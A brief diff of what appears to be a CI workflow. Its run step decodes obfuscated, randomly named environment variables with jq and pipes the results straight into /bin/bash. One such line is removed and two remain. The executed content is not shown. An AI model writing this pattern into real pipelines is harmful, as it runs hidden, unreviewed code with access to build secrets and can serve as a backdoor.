@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$lqyev13" | jq -r .xo69 | /bin/bash
           echo $vn91 | jq -r .no568 | /bin/bash
-          echo $gp14 | jq -r .zvy95 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
